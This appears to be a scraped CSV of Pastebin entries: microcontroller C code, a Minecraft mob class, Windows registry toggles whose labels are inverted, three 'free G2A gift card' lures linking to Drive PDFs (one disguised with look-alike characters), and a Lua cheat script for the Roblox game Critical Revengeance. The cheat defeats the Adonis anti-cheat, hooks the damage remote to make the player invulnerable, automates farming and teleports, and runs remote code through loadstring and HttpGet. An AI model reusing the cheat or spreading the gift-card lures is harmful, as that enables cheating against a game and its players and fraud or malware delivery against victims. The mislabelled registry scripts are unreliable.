id,title,username,language,date,content
iUF5pNLk,pastebin.ai - New pastebin.com alternative,xxsa,PHP,Tuesday 23rd of April 2024 07:02:31 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
............
....................."
fUwAbCMa,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 💰,ssss50w,GetText,Tuesday 23rd of April 2024 06:40:26 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
23 April 2024"
i0CeF76d,Square_wave_8051,Sarthak_Dandgawhal,C,Tuesday 23rd of April 2024 06:35:48 PM CDT,"// SQUARE_WAVE_KEIL_8051

#include <reg51.h>
sbit pin = P1^0;
main()
{
      P1 = 0x00;
      TMOD = 0x09;
loop:TL0 = 0xAF;
      TH0 = 0x3C;
       pin = 1;
       TR0 = 1;
       while(TF0 == 0)  {}

       TL0 = 0xAF;
       TH0 = 0x3C;
       pin = 0;
      while(TF0 == 0)  {}  
  goto loop;
}
-------------------------------------------------------------------------------------------------------------------------
// LED interfacing

#include <reg51.h>

sbit LED = P1^0;

void delay(unsigned int y){
    unsigned int i, j;
    for(i = 0; i < y; i++) {
        for(j = 0; j < 1275; j++) {
        }
    }
}
void main(){
    while(1) {
        delay(100);
        LED = 0;
        delay(100);
        LED = 1;
    }
}
-------------------------------------------------------------------------------------------------------------------------

// DC Motor interfacing

#include<reg51.h>
#include<stdio.h>

void delay(void);

sbit motor_pin_1 = P2^0;
sbit motor_pin_2 = P2^1;

void main()
{
  do
  {
\    motor_pin_1 = 1;
    motor_pin_2 = 0; //Rotates Motor Anit Clockwise
    delay();
    motor_pin_1 = 1;
    motor_pin_2 = 1; //Stops Motor
    delay();
    motor_pin_1 = 0;
    motor_pin_2 = 1; //Rotates Motor Clockwise
    delay();
    motor_pin_1 = 0;
    motor_pin_2 = 0; //Stops Motor
    delay();
  }while(1);
}

void delay()
{
  int i,j;
  for(i=0;i<1000;i++){
    for(j=0;j<1000;j++){
    }
}
}

-------------------------------------------------------------------------------------------------------------------------
// LCD Interfacing

#include<reg51.h>
#define display_port P2
sbit rs = P3^2;
sbit rw = P3^3;
sbit e =  P3^4;

void msdelay(unsigned int time)
{
    unsigned i,j ;
    for(i=0;i<time;i++);   
    for(j=0;j<1275;j++);
}
void lcd_cmd(unsigned char command)
{
    display_port = command;
    rs= 0;
    rw=0;
    e=1;
    msdelay(1);
    e=0;
}
void lcd_data(unsigned char disp_data)
{
    display_port = disp_data;
    rs= 1;
    rw=0;
    e=1;
    msdelay(1);
    e=0;
}
void lcd_init()
{
    lcd_cmd(0x38);
    msdelay(10);
    lcd_cmd(0x0F);
    msdelay(10);
    lcd_cmd(0x01);
    msdelay(10);
    lcd_cmd(0x81);
    msdelay(10);
}
void main()
{
    unsigned char a[8]=""TESGING"";
    int l=0;
    lcd_init();
    while(a[l] != '\0')
    {
        lcd_data(a[l]);
        l++;
        msdelay(50);
    }
}

-------------------------------------------------------------------------------------------------------------------------

"
ewBNhvbj,Critical Revengeance Script,seehuangdeung,Lua,Tuesday 23rd of April 2024 06:31:34 PM CDT,"-- Join the discord for suggestions / updates to future versions
-- https://discord.gg/56Wr5TDM5t
-- The auto mob is very buggy and doesnt work atm so I recommend not using it.
-- Some shops will kick you im not sure which tell me in discord which shop kicks you.

-- // GLOBALS

getgenv().connections = connections or {}

-- // VARIABLES

local player = game.Players.LocalPlayer

local enemiesWs = workspace.Enemies
local oresWs = workspace.Harvestables.Ores
local chestSpawnsWs = workspace.ChestSpawnLocations
local areaZonesWs = workspace.Area_Hitboxes
local shrinesWs = workspace.NewStatues
local shopsWs = workspace.Shops

local enemiesRs = game:GetService(""ReplicatedStorage"").Enemy

local receiveDamageRm = game:GetService(""ReplicatedStorage""):WaitForChild(""Remotes""):WaitForChild(""Damage"")
local combatTriggerRm = workspace:WaitForChild(""Enemies""):WaitForChild(""Grassy Fields""):WaitForChild(""Enemy""):WaitForChild(""CombatTrigger"")
local itemSetupRm = game:GetService(""ReplicatedStorage""):WaitForChild(""Remotes""):WaitForChild(""ItemSetup"")
local healRm = game:GetService(""ReplicatedStorage"").Remotes.Heal

-- // FUNCTIONS

do -- [[ GENERAL HELPERS ]]
    
    function movePlrToPosition(part, amountOfTime)

        local hrp = player.Character.HumanoidRootPart
        local newVelocity = Instance.new('LinearVelocity')
        local dis = (hrp.Position - part.Position).Magnitude

        newVelocity.MaxForce = math.huge
        newVelocity.Attachment0 = hrp.RootAttachment
        newVelocity.VectorVelocity = (part.Position - hrp.Position).Unit * 70
        newVelocity.Parent = hrp

        repeat
            newVelocity.VectorVelocity = (part.Position - hrp.Position).Unit * 70
            task.wait()
        until part == nil or part.Parent == nil or not Toggles['MOBS_AUTOFARM'].Value

        newVelocity:Destroy()
    end
end
do -- [[ FETCHER HELPERS ]]

    function getInventoryData(plr)
        plr = plr or player

    end
    function getAllMobTypes()
        local tbl = {}
        for _, folder in enemiesRs:GetChildren() do
            if not folder:IsA('Folder') then continue end
            for _, mobModel in folder:GetChildren() do
                table.insert(tbl, mobModel.Name)
            end
        end
        return tbl
    end
    function getAllZones(stringArrayBool)
        local t = {}

        for _, areaPart in areaZonesWs:GetChildren() do
            table.insert(t, areaPart.Name)
        end

        if stringArrayBool then
            return t
        else
            return areaZonesWs:GetChildren()
        end
    end
    function getInstanceChildrenAsArray(instance, ofInstanceType, excludedStrArray)
        local t = {}
        for _, child in instance:GetChildren() do
            if ofInstanceType ~= nil then
                if not child:IsA(ofInstanceType) then continue end
            end
            if excludedStrArray ~= nil then
                if table.find(excludedStrArray, child.Name) then continue end
            end
            table.insert(t, child.Name)
        end
        return t
    end
end
do -- [[ AUTOFARMS ]]

    function initMobAutoFarm()
        --This will initialize the autofarm, and will listen to a value changed event.

        Toggles['MOBS_AUTOFARM']:OnChanged(function()
            local bool = Toggles['MOBS_AUTOFARM'].Value
            print(bool)

            if bool then
                local whitelistedMobs = Options.MOBS_WHITELIST.Value

                for _, enemyModelFolder in enemiesWs:GetChildren() do
                    if not enemyModelFolder:IsA('Folder') then continue end
                    for _, enemyModel in enemyModelFolder:GetChildren() do
                        if not enemyModel:IsA('Model') then continue end
                        if not whitelistedMobs[tostring(enemyModel.Model.Value)] then continue end
                        local combatFolder = nil
                        local orbsFolder = nil

                        --warn(enemyModel.Model.Value)

                        repeat
                            player.Character:PivotTo(enemyModel.WorldPivot)
                            task.wait(.05)
                        until game.Workspace:FindFirstChild('CombatFolder') ~= nil or not Toggles['MOBS_AUTOFARM'].Value
                        --rconsoleprint('Got CombatFolder')

                        combatFolder = game.Workspace.CombatFolder
                        orbsFolder = combatFolder:WaitForChild(player.Name)

                        repeat
                            if #orbsFolder:GetChildren() == 0 then
                                --player.Character:PivotTo(enemyModel.WorldPivot * CFrame.new(0,20,0))
                            end
                            for _, orb in orbsFolder:GetChildren() do
                                repeat task.wait() until orb.PrimaryPart ~= nil
                                movePlrToPosition(orb.PrimaryPart, 2)
                                --player.Character:PivotTo(orb.WorldPivot)
                                repeat
                                    task.wait(.1)
                                    --player.Character:PivotTo(orb.WorldPivot)
                                until orb == nil or orb.Parent == nil
                            end
                            task.wait(.05)
                        until enemyModel == nil or enemyModel.Parent == nil or combatFolder == nil or not Toggles['MOBS_AUTOFARM'].Value
                    end
                end

            end
        end)

    end

    function initOreAutoFarm()
        --This will initialize the autofarm, and will listen to a value changed event.
        local function getMineableOres()
            local amountMineable = 0
            for _, ore in oresWs:GetChildren() do
                if not Options['ORES_DROPDOWN'].Value[ore.Name] then continue end
                if ore.HasOre.Value == true then amountMineable += 1 end
            end
            return amountMineable
        end

        local function getClosestOre()
            local closestOre, closestDis = nil, math.huge
            for _, ore in oresWs:GetChildren() do
                if not Options['ORES_DROPDOWN'].Value[ore.Name] then continue end
                if ore.HasOre.Value == false then continue end
                local mag = (player.Character.PrimaryPart.Position - ore.Position).Magnitude
                if mag < closestDis then
                    closestDis = mag
                    closestOre = ore
                end
            end
            return closestOre
        end

        Toggles['ORES_AUTOFARM']:OnChanged(function()
            local bool = Toggles['ORES_AUTOFARM'].Value
            print(bool)
            if bool then
                itemSetupRm:FireServer('Silver Pickaxe')
                itemSetupRm:FireServer('Titanium Pickaxe')
                local lastLoggedCFrame = player.Character.PrimaryPart.CFrame
                repeat
                    local closestOre = getClosestOre()
                    local proxPrompt = closestOre:FindFirstChildWhichIsA('ProximityPrompt')

                    repeat
                        player.Character:PivotTo(closestOre.CFrame)
                        fireproximityprompt(proxPrompt)
                        task.wait(.1)
                    until closestOre.HasOre.Value == false or not Toggles['ORES_AUTOFARM'].Value

                    task.wait(.05)
                until not Toggles['ORES_AUTOFARM'].Value

                --warn('Finalized Ores Autofarm')
                player.Character:PivotTo(lastLoggedCFrame * CFrame.new(0,5,0))
            else
            end
        end)

    end

    function initChestAutoFarm()
        local function attemptOpenChest(chestModel)
            local lastCFrame = player.Character.PrimaryPart.CFrame
            local proxPrompt = chestModel.Box.ChestPrompt
            repeat
                player.Character:PivotTo(chestModel.Box.CFrame * CFrame.new(0,1,0))
                fireproximityprompt(proxPrompt)
                task.wait(.1)
            until proxPrompt.Enabled == false or not Toggles['CHESTS_AUTOFARM'].Value or chestModel == nil
            player.Character:PivotTo(lastCFrame)
        end

        for i, chestHolder in chestSpawnsWs:GetChildren() do
            connections['chest_' .. i] = chestHolder.ChildAdded:Connect(function(child)
                task.wait(.3)
                if Toggles['CHESTS_AUTOFARM'].Value then
                    attemptOpenChest(child)
                end
            end)
        end

        Toggles['CHESTS_AUTOFARM']:OnChanged(function()
            local bool = Toggles['CHESTS_AUTOFARM'].Value
            print(bool)
            if bool then
               for _, chestHolder in chestSpawnsWs:GetChildren() do
                    local chestModel = chestHolder:FindFirstChild('Chest')
                    if not chestModel then continue end
                    if not chestModel.Box.ChestPrompt.Enabled then continue end
                    attemptOpenChest(chestModel)
                    task.wait(.02)
               end
            else
            end
        end)
    end

end
do -- [[ TELEPORTS ]] --
    function initTeleportsGui()
        local types = {
            ['TP_SHRINES'] = function(callback) player.Character:PivotTo(shrinesWs:FindFirstChild(callback).WorldPivot * CFrame.new(0,10,0)) end,
            ['TP_SHOPS'] = function(callback) player.Character:PivotTo(shopsWs:FindFirstChild(callback).WorldPivot) end
        }

        for type, func in types do
            Options[type]:OnChanged(function()
                if Options[type].Value == nil or Options[type].Value == '' then return end
                local s,e = pcall(function()
                    types[type](Options[type].Value)
                end)
                if e then warn(e) end
            end)
        end

    end
end
do -- [[ SPOOFERS ]]

    function initAntiAdonis()
        if getgenv().adonisACcustom then return end

        local function bypass()
            local isLoaded = false
            for _, v in getgc(true) do
                if typeof(v) ~= 'table' then continue end

                if rawget(v, 'indexInstance') then
                    for method, tbl in pairs(v) do
                        pcall(function()
                            if isexecutorclosure(tbl[2]) then return end
                            if iscclosure(tbl[2]) then return end
                            isLoaded = true
                            tbl[2] = function() return false end
                        end)
                    end
                end
            end

            if isLoaded then
                return true
            else
                return false
            end
        end

        -- Incase adonis takes some time to load.

        repeat
            local result = bypass()
            task.wait(3)
        until result or getgenv().adonisACcustom


        getgenv().adonisACcustom = true
        warn('Adonis Finalized')
    end

    function initSpoofRemotes()

        local remoteEventAssociations = {
            ['damage'] = function(instance, args)
                return nil
            end,
        }

        local old;old = hookmetamethod(game, ""__namecall"", function(self, ...)
            local args = {...}
            if self == receiveDamageRm then
                print(getnamecallmethod())
            end
            if getnamecallmethod() == ""FireServer"" and self == receiveDamageRm then
                print('DAMAGE CALLED')
                if args[1] == player.Character then
                    print('DAMAGE PREVENTED')
                    return nil
                end
            end

            return old(self, ...)
        end)

    end

end
do -- [[ CLEAN UP ]]
    function cleanConnections()
        for key, con in connections do
            con:Disconnect()
            connections[key] = nil
        end
        table.clear(connections)
    end
end

-- // GUI

local repo = 'https://raw.githubusercontent.com/mrchigurh/LinoriaLib/main/'
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
local Window = Library:CreateWindow({
    Title = 'Critical Revengeance | V1',
    Center = true,
    AutoShow = true,
})
local Tabs = {

    ['Main'] = Window:AddTab('Main'),
    ['Settings'] = Window:AddTab('Settings'),
    ['UI Settings'] = Window:AddTab('UI Settings')

}

do -- [[ Mobs Autofarm Groupbox ]]
    local Groupbox = Tabs.Main:AddLeftGroupbox('Mobs Autofarm (not finished/buggy)')
    Groupbox:AddToggle('MOBS_AUTOFARM', {
        Text = 'Mobs Autofarm',
        Default = false, -- Default value (true / false)
        Tooltip = 'Will begin autofarming mobs.', -- Information shown when you hover over the toggle
    })
    Groupbox:AddDropdown('MOBS_WHITELIST', {
        Values = getAllMobTypes(),
        Default = 0, -- number index of the value / string
        Multi = true, -- true / false, allows multiple choices to be selected
        Compact = true,
        Text = 'Mobs Whitelist',
        Tooltip = 'Mobs Whitelist. Select none for all.', -- Information shown when you hover over the dropdown
    })

end

do -- [[ Ores Autofarm Groupbox ]]
    local Groupbox = Tabs.Main:AddLeftGroupbox('Ores Autofarm')
    Groupbox:AddToggle('ORES_AUTOFARM', {
        Text = 'Ores Autofarm',
        Default = false, -- Default value (true / false)
        Tooltip = 'Will begin autofarming ores.', -- Information shown when you hover over the toggle
    })

    Groupbox:AddDropdown('ORES_DROPDOWN', {
        Values = { 'Copper', 'Gold', 'Silver', 'Titanium', 'Uranium' },
        Default = 1, -- number index of the value / string
        Multi = true, -- true / false, allows multiple choices to be selected

        Text = 'Ores Whitelist',
        Tooltip = 'Select the ores you want to automine.', -- Information shown when you hover over the dropdown
    })

end

do -- [[ Chests Autofarm Groupbox ]]
    local Groupbox = Tabs.Main:AddLeftGroupbox('Chests Autofarm')
    Groupbox:AddToggle('CHESTS_AUTOFARM', {
        Text = 'Chests Autofarm',
        Default = false, -- Default value (true / false)
        Tooltip = 'Will begin autofarming chests.', -- Information shown when you hover over the toggle
    })
end

do -- [[ Teleports Groupbox ]]
    local Groupbox = Tabs.Main:AddRightGroupbox('Teleports')
    Groupbox:AddDropdown('TP_SHRINES', {
        Values = getInstanceChildrenAsArray(shrinesWs),
        Default = 0, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected

        Text = 'Shrines',
    })
    Groupbox:AddDropdown('TP_SHOPS', {
        Values = getInstanceChildrenAsArray(shopsWs, 'Model', {'MM BMarket Shop', 'BMarket Shop'}),
        Default = 0, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected

        Text = 'Shops',
    })
end


do -- [[ Final Load ]]
    Library:OnUnload(function()
        print('Unloaded!')
        Library.Unloaded = true
    end)

    local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
    MenuGroup:AddButton('Unload', function() Library:Unload() end)
    MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'LeftAlt', NoUI = true, Text = 'Menu keybind' })
    ThemeManager:SetLibrary(Library)
    SaveManager:SetLibrary(Library)
    SaveManager:IgnoreThemeSettings()
    SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
    ThemeManager:SetFolder('linoria_lib')
    SaveManager:SetFolder('linoria_lib/Critical_Revengeance')
    SaveManager:BuildConfigSection(Tabs['UI Settings'])
    ThemeManager:ApplyToTab(Tabs['UI Settings'])
    SaveManager:LoadAutoloadConfig()
    Library.ToggleKeybind = Options.MenuKeybind
end

-- // MAIN

task.defer(function()
    initAntiAdonis()
end)
cleanConnections()
initTeleportsGui()
initMobAutoFarm()
initOreAutoFarm()
initChestAutoFarm()"
DjJqnHX4,Sea Otter 2,jayhillx,Java,Tuesday 23rd of April 2024 06:30:11 PM CDT,"package com.mysticsbiomes.common.entity.animal;

import com.mysticsbiomes.init.MysticEntities;
import com.mysticsbiomes.init.MysticItems;
import net.minecraft.core.BlockPos;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.syncher.EntityDataAccessor;
import net.minecraft.network.syncher.EntityDataSerializers;
import net.minecraft.network.syncher.SynchedEntityData;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.util.Mth;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.InteractionResult;
import net.minecraft.world.entity.*;
import net.minecraft.world.entity.ai.attributes.AttributeSupplier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.ai.behavior.BehaviorUtils;
import net.minecraft.world.entity.ai.control.MoveControl;
import net.minecraft.world.entity.ai.control.SmoothSwimmingLookControl;
import net.minecraft.world.entity.ai.control.SmoothSwimmingMoveControl;
import net.minecraft.world.entity.ai.goal.*;
import net.minecraft.world.entity.ai.navigation.PathNavigation;
import net.minecraft.world.entity.ai.navigation.WaterBoundPathNavigation;
import net.minecraft.world.entity.ai.util.DefaultRandomPos;
import net.minecraft.world.entity.animal.Animal;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.Items;
import net.minecraft.world.item.crafting.Ingredient;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.LevelReader;
import net.minecraft.world.level.block.state.BlockState;
import net.minecraft.world.level.pathfinder.BlockPathTypes;
import net.minecraft.world.level.pathfinder.PathComputationType;
import net.minecraft.world.level.pathfinder.PathFinder;
import net.minecraft.world.level.pathfinder.SwimNodeEvaluator;
import net.minecraft.world.phys.Vec3;

import javax.annotation.Nullable;
import java.util.EnumSet;

/**
 * swims on the surface.
 * only swims underwater fully when playing or searching for food.
 */
public class SeaOtter extends Animal {
    private static final EntityDataAccessor<Boolean> DATA_FLOATING_ID = SynchedEntityData.defineId(SeaOtter.class, EntityDataSerializers.BOOLEAN);
    private static final EntityDataAccessor<Boolean> DATA_SWIMMING_ID = SynchedEntityData.defineId(SeaOtter.class, EntityDataSerializers.BOOLEAN);
    int ticksSinceSearchedForFood;
    int cooldownBeforeFindingFoodAgain;
    boolean needsToSurface;

    public final AnimationState idleAnimationState = new AnimationState();

    public SeaOtter(EntityType<? extends SeaOtter> type, Level level) {
        super(type, level);
        this.setPathfindingMalus(BlockPathTypes.WATER, 0.0F);
        this.moveControl = new SeaOtter.SeaOtterMoveControl(this);
        this.lookControl = new SmoothSwimmingLookControl(this, 10);
    }

    protected void defineSynchedData() {
        super.defineSynchedData();
        this.entityData.define(DATA_FLOATING_ID, false);
        this.entityData.define(DATA_SWIMMING_ID, false);
    }

    protected void registerGoals() {
        this.goalSelector.addGoal(1, new SeaOtter.SearchForFoodGoal());
        this.goalSelector.addGoal(2, new SeaOtter.FloatAtSurfaceGoal());
        this.goalSelector.addGoal(2, new SeaOtter.SwimToSurfaceGoal(this, 1.0D, 16));
        this.goalSelector.addGoal(3, new SeaOtter.SwimAroundGoal(this, 1.0D, 10));
        this.goalSelector.addGoal(4, new LookAtPlayerGoal(this, Player.class, 6.0F));
        this.goalSelector.addGoal(5, new RandomLookAroundGoal(this));
    }

    public static AttributeSupplier.Builder createAttributes() {
        return Mob.createMobAttributes().add(Attributes.MAX_HEALTH, 16.0F).add(Attributes.MOVEMENT_SPEED, 0.25D);
    }

    public void addAdditionalSaveData(CompoundTag tag) {
        super.addAdditionalSaveData(tag);
        tag.putBoolean(""Floating"", this.isFloating());
        tag.putBoolean(""Swimming"", this.isSwimming());
    }

    public void readAdditionalSaveData(CompoundTag tag) {
        super.readAdditionalSaveData(tag);
        this.setFloating(tag.getBoolean(""Floating""));
        this.setSwimming(tag.getBoolean(""Swimming""));
    }

    public AgeableMob getBreedOffspring(ServerLevel level, AgeableMob mob) {
        return MysticEntities.SEA_OTTER.get().create(level);
    }

    public MobType getMobType() {
        return MobType.WATER;
    }

    // TICKS & A.I.

    public void tick() {
        super.tick();

        if (this.level().isClientSide) {
            this.idleAnimationState.animateWhen(this.isFloating(), this.tickCount);
        }
    }

    public void aiStep() {
        super.aiStep();
        ++this.ticksSinceSearchedForFood;

        if (this.cooldownBeforeFindingFoodAgain > 0) {
            --this.cooldownBeforeFindingFoodAgain;
        }

        if (this.isFloating()) {
            this.setDeltaMovement(this.getDeltaMovement().multiply(1.0D, 0.0D, 1.0D));
            this.setYya(0.0F);
        }

        if (this.isUnderWater() && (this.getAirSupply() < 200 || this.random.nextFloat() <= 0.001F)) {
            this.setNeedsToSurface(true);
        }
    }

    // NAVIGATION & MOVEMENT

    protected PathNavigation createNavigation(Level level) {
        return new SeaOtter.SeaOtterPathNavigation(this, level);
    }

    public void travel(Vec3 vec3) {
        if (this.isEffectiveAi() && this.isInWater()) {
            this.moveRelative(this.getSpeed(), vec3);
            this.move(MoverType.SELF, this.getDeltaMovement());
            this.setDeltaMovement(this.getDeltaMovement().scale(0.9D));
        } else {
            super.travel(vec3);
        }
    }

    public int getMaxAirSupply() {
        return 6000;
    }

    public boolean isFloating() {
        return this.entityData.get(DATA_FLOATING_ID);
    }

    public void setFloating(boolean value) {
        this.entityData.set(DATA_FLOATING_ID, value);
        this.entityData.set(DATA_SWIMMING_ID, !value);
    }

    public boolean isSwimming() {
        return this.entityData.get(DATA_SWIMMING_ID);
    }

    public void setSwimming(boolean value) {
        this.entityData.set(DATA_SWIMMING_ID, value);
        this.entityData.set(DATA_FLOATING_ID, !value);
    }

    public boolean wantsToSearchForFood() {
        return this.ticksSinceSearchedForFood > 200;
    }

    /**
     * @return when they need to breath above water, to eat, or to sleep.
     */
    public boolean needsToSurface() {
        return this.needsToSurface;
    }

    public void setNeedsToSurface(boolean needsToSurface) {
        this.needsToSurface = needsToSurface;
    }

    @Override
    public InteractionResult mobInteract(Player player, InteractionHand hand) {
        boolean flag = player.getItemInHand(hand).is(Items.STICK);
        this.setFloating(flag);
        this.setSwimming(!flag);
        return super.mobInteract(player, hand);
    }

    // TODO: GOALS

    class FloatAtSurfaceGoal extends Goal {

        public boolean canUse() {
            return !SeaOtter.this.isSwimming() || !SeaOtter.this.wantsToSearchForFood();
        }

        public void start() {
            SeaOtter.this.setFloating(true);
        }
    }

    class SwimToSurfaceGoal extends MoveToBlockGoal {

        SwimToSurfaceGoal(PathfinderMob mob, double speed, int range) {
            super(mob, speed, range);
            this.setFlags(EnumSet.of(Flag.MOVE, Flag.LOOK));
        }

        public boolean canUse() {
            return super.canUse() && SeaOtter.this.needsToSurface() && !SeaOtter.this.isFloating() && !SeaOtter.this.onGround();
        }

        public void stop() {
            SeaOtter.this.setNeedsToSurface(false);
            SeaOtter.this.getNavigation().stop();
        }

        protected boolean isValidTarget(LevelReader reader, BlockPos pos) {
            return reader.getBlockState(pos.above()).isAir();
        }
    }

    class SwimAroundGoal extends RandomSwimmingGoal {

        SwimAroundGoal(PathfinderMob mob, double speed, int interval) {
            super(mob, speed, interval);
        }

        public boolean canUse() {
            return super.canUse() && !SeaOtter.this.isFloating();
        }

        public boolean canContinueToUse() {
            return super.canContinueToUse() && !SeaOtter.this.isFloating();
        }

        public void start() {
            super.start();
            SeaOtter.this.setSwimming(true);
        }
    }

    class SearchForFoodGoal extends Goal {
        int ticks;

        public boolean canUse() {
            return SeaOtter.this.wantsToSearchForFood() && SeaOtter.this.cooldownBeforeFindingFoodAgain <= 0;
        }

        public boolean canContinueToUse() {
            return !this.hasSearchedLongEnough();
        }

        public void start() {
            this.ticks = 0;
            SeaOtter.this.setSwimming(true);
        }

        public void stop() {
            if (this.hasSearchedLongEnough()) {
                SeaOtter.this.cooldownBeforeFindingFoodAgain = 200;
                SeaOtter.this.setFloating(true);
            }

            this.ticks = 0;
        }

        private boolean hasSearchedLongEnough() {
            return this.ticks > 200;
        }

        public void tick() {
            ++this.ticks;
        }
    }

    // TODO: NAVIGATION & CONTROLS

    class SeaOtterMoveControl extends MoveControl {

        public SeaOtterMoveControl(Mob mob) {
            super(mob);
        }

        @Override
        public void tick() {
            if (SeaOtter.this.isInWater()) {
                SeaOtter.this.setDeltaMovement(SeaOtter.this.getDeltaMovement().add(SeaOtter.this.getLookAngle().scale(SeaOtter.this.isFloating() ? 0.002F : 0.005F)));

                if (!SeaOtter.this.isFloating()) {
                    if (this.operation == Operation.MOVE_TO && !this.mob.getNavigation().isDone()) {
                        double d0 = this.wantedX - this.mob.getX();
                        double d1 = this.wantedY - this.mob.getY();
                        double d2 = this.wantedZ - this.mob.getZ();
                        double distanceSqr = d0 * d0 + d1 * d1 + d2 * d2;

                        if (distanceSqr < (double) 2.5000003E-7F) {
                            this.mob.setZza(0.0F);
                        } else {
                            float yRot = (float) (Mth.atan2(d2, d0) * (double) (180F / (float) Math.PI)) - 90.0F;
                            this.mob.setYRot(this.rotlerp(this.mob.getYRot(), yRot, 40.0F));
                            this.mob.yBodyRot = this.mob.getYRot();
                            this.mob.yHeadRot = this.mob.getYRot();
                            float speed = (float) (this.speedModifier * this.mob.getAttributeValue(Attributes.MOVEMENT_SPEED));
                            this.mob.setSpeed(speed * 0.2F);

                            double horizontalDistance = Math.sqrt(d0 * d0 + d2 * d2);
                            if (Math.abs(d1) > (double) 1.0E-5F || Math.abs(horizontalDistance) > (double) 1.0E-5F) {
                                float xRot = -((float) (Mth.atan2(d1, horizontalDistance) * (double) (180F / (float) Math.PI)));
                                xRot = Mth.clamp(Mth.wrapDegrees(xRot), -180.0F, 180.0F);
                                this.mob.setXRot(this.rotlerp(this.mob.getXRot(), xRot, 45.0F));
                            }

                            BlockPos wantedPos = new BlockPos((int) this.wantedX, (int) this.wantedY, (int) this.wantedZ);
                            BlockState wantedBlockState = this.mob.level().getBlockState(wantedPos);

                            if (d1 > (double) this.mob.maxUpStep() && d0 * d0 + d2 * d2 < 4.0F && d1 <= 1.0D && wantedBlockState.getFluidState().isEmpty()) {
                                this.mob.getJumpControl().jump();
                                this.mob.setSpeed(speed);
                            }

                            float f0 = Mth.cos(this.mob.getXRot() * ((float) Math.PI / 180F));
                            float f1 = Mth.sin(this.mob.getXRot() * ((float) Math.PI / 180F));
                            this.mob.zza = f0 * speed;
                            this.mob.yya = -f1 * (speed);
                        }
                    } else {
                        this.mob.setSpeed(0.0F);
                        this.mob.setXxa(0.0F);
                        this.mob.setYya(0.0F);
                        this.mob.setZza(0.0F);
                    }
                }
            } else {
                super.tick();
            }
        }
    }

    static class SeaOtterPathNavigation extends WaterBoundPathNavigation {

        public SeaOtterPathNavigation(Mob mob, Level level) {
            super(mob, level);
        }

        protected PathFinder createPathFinder(int nodes) {
            this.nodeEvaluator = new SwimNodeEvaluator(true);
            return new PathFinder(this.nodeEvaluator, nodes);
        }

        protected boolean canUpdatePath() {
            return true;
        }
    }

}"
M5rLzvh2,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Tuesday 23rd of April 2024 06:04:55 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_162058.pdf

Working as of:
23 April 2024"
hKVnJ59R,🔥 G2A.com Free Gift Card Guide Apr 2024 NEW🔥,jordanthebordan,GetText,Tuesday 23rd of April 2024 05:06:06 PM CDT,"G2А.com frеe gift cаrd & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to dаte versiоn of this scriрt. Any оther one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1J2K7N8g5mZ_Zp-S0cjQrax7KrPk97EG3/view?usp=sharing
 
Working as of:
24 Аpril 2024"
4cybhFxy,disable_all_visibility_options,Python253,Bash,Tuesday 23rd of April 2024 04:03:56 PM CDT,"#!/bin/bash

# Disable hidden files
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Hidden /t REG_DWORD /d 0 /f > /dev/null

# Disable file extensions
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v HideFileExt /t REG_DWORD /d 0 /f > /dev/null

# Disable super hidden files
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v ShowSuperHidden /t REG_DWORD /d 0 /f > /dev/null

echo ""Visibility Options Disabled:\nHidden files, file extensions, and super hidden files are now Disabled.""


"
Je4M15Wq,enable_all_visibility_options,Python253,Bash,Tuesday 23rd of April 2024 04:02:55 PM CDT,"#!/bin/bash

# Enable hidden files
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Hidden /t REG_DWORD /d 1 /f > /dev/null

# Enable file extensions
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v HideFileExt /t REG_DWORD /d 1 /f > /dev/null

# Enable super hidden files
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v ShowSuperHidden /t REG_DWORD /d 1 /f > /dev/null

echo ""Visibility Options Enabled:\nHidden files, file extensions, and super hidden files are now enabled.""

"
